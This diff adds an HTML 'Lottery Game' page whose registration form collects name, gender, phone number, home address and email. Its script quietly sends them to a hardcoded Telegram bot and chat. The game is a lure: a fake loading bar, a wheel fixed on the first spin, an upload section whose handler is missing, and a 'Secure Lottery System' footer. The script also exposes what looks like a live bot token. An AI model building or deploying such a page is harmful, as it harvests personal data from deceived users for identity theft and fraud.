@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lottery Game</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+        }
+        header, footer {
+            padding: 10px;
+            background-color: #333;
+            color: white;
+        }
+        .container {
+            margin: 20px auto;
+            max-width: 400px;
+            background: #222;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        input {
+            background: #333;
+            color: white;
+        }
+        button {
+            background: #ffcc00;
+            cursor: pointer;
+        }
+        #lottery-list {
+            font-size: 14px;
+            display: none;
+        }
+        #loading-bar {
+            display: none;
+            font-size: 20px;
+        }
+        .wheel-container {
+            display: none;
+        }
+        .wheel {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            border: 10px solid white;
+            position: relative;
+            margin: 20px auto;
+            transition: transform 3s ease-out;
+        }
+        .segment {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            clip-path: polygon(50% 50%, 100% 0, 100% 100%);
+            transform-origin: center;
+        }
+        .segment:nth-child(1) { background: red; transform: rotate(0deg); }
+        .segment:nth-child(2) { background: blue; transform: rotate(51.4deg); }
+        .segment:nth-child(3) { background: green; transform: rotate(102.8deg); }
+        .segment:nth-child(4) { background: yellow; transform: rotate(154.2deg); }
+        .segment:nth-child(5) { background: orange; transform: rotate(205.6deg); }
+        .segment:nth-child(6) { background: purple; transform: rotate(257deg); }
+        .segment:nth-child(7) { background: pink; transform: rotate(308.4deg); }
+        .segment:nth-child(8) { background: gray; transform: rotate(360deg); }
+        #upload-section {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Lottery Game</h1>
+</header>
+
+<div class="container" id="registration">
+    <h2>Register to Play</h2>
+    <input type="text" id="name" placeholder="Full Name">
+    <input type="text" id="gender" placeholder="Gender">
+    <input type="text" id="phone" placeholder="Phone Number">
+    <input type="text" id="address" placeholder="Home Address">
+    <input type="email" id="email" placeholder="E-mail">
+    <button onclick="submitForm()">Register</button>
+</div>
+
+<p id="lottery-list"></p>
+<p id="loading-bar">Loading your lottery game: <span id="progress">0%</span></p>
+<button id="start-game" style="display:none;" onclick="showWheel()">GO FOR IT</button>
+
+<div class="wheel-container">
+    <div class="wheel" id="wheel">
+        <div class="segment"></div>
+        <div class="segment"></div>
+        <div class="segment"></div>
+        <div class="segment"></div>
+        <div class="segment"></div>
+        <div class="segment"></div>
+        <div class="segment"></div>
+        <div class="segment"></div>
+    </div>
+    <button onclick="spinWheel()">Spin</button>
+</div>
+
+<div id="upload-section">
+    <h2>Upload Your Picture</h2>
+    <input type="file" id="file">
+    <button onclick="uploadFile()">Upload</button>
+</div>
+
+<footer>
+    <p>Powered by Secure Lottery System</p>
+</footer>
+
+<script>
+    let telegramToken = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
+    let chatID = "874563737";
+    let firstSpin = true;
+
+    function submitForm() {
+        let name = document.getElementById("name").value;
+        let gender = document.getElementById("gender").value;
+        let phone = document.getElementById("phone").value;
+        let address = document.getElementById("address").value;
+        let email = document.getElementById("email").value;
+        
+        let message = `New Registration:\nName: ${name}\nGender: ${gender}\nPhone: ${phone}\nAddress: ${address}\nEmail: ${email}`;
+        
+        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`)
+        .then(() => {
+            document.getElementById("registration").style.display = "none";
+            startGameSequence();
+        });
+    }
+
+    function startGameSequence() {
+        let progress = 0;
+        document.getElementById("loading-bar").style.display = "block";
+        let interval = setInterval(() => {
+            progress++;
+            document.getElementById("progress").innerText = progress + "%";
+            if (progress === 100) {
+                clearInterval(interval);
+                document.getElementById("loading-bar").style.display = "none";
+                document.getElementById("start-game").style.display = "block";
+            }
+        }, 50);
+    }
+
+    function showWheel() {
+        document.getElementById("start-game").style.display = "none";
+        document.querySelector(".wheel-container").style.display = "block";
+    }
+
+    function spinWheel() {
+        let degrees = firstSpin ? 360 : 1080 + Math.floor(Math.random() * 360);
+        document.getElementById("wheel").style.transform = `rotate(${degrees}deg)`;
+        firstSpin = false;
+    }
+</script>
+
+</body>
+</html>
